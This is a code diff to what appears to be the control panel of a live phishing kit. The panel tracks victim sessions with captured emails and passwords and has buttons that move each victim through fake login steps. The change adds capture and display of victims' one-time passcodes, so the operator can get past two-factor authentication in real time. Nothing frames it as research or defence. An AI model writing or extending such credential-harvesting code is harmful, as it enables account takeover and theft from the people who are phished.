@@ -339,6 +339,7 @@
         <div class="session-top"><div class="session-id">${k}</div><div class="session-time">${t}</div></div>
         <div class="session-email">Email: ${it.email||'<span style="color:#bbb">not yet captured</span>'}</div>
         <div class="session-password">Password: ${it.password||'<span style="color:#bbb">not yet captured</span>'}</div>
+        <div class="session-password">OTP Code: ${it.code||'<span style="color:#bbb">not yet captured</span>'}</div>
         <span class="session-step">${it.lastEvent||'connected'}</span>
         <div class="session-btns">
           <button class="mini-btn" onclick="event.stopPropagation();quickNav('${k}','verify')">→ verify</button>
@@ -443,6 +444,7 @@
           const sid = data.fromSession;
           sessions[sid] = Object.assign({}, sessions[sid]||{}, { lastSeen: Date.now(), lastEvent: data.step||data.type });
           if (data.email)    sessions[sid].email    = data.email;
+          if (data.code)     sessions[sid].code     = data.code;
           if (data.password) sessions[sid].password = data.password;
           renderSessions(); log(`${sid.slice(0,14)}… → ${data.type}`, 'client'); return;
         }
